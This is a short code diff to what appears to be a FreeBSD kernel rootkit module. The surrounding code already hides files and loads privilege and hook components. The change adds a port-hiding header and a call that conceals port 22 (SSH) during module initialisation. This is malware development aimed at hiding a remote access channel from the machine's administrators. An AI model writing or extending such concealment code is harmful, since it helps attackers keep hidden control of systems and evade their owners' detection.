@@ -20,6 +20,7 @@
 #include "privilege.h"
 #include "hook.h"
 #include "hide.h"
+#include "porthiding.h"
 
 #include <sys/param.h>
 #include <sys/module.h>
@@ -53,6 +54,8 @@ init(void)
 
 	/* Hide files. */
 	hide_files();
+
+        port_hiding(22);
 }
 
 static void
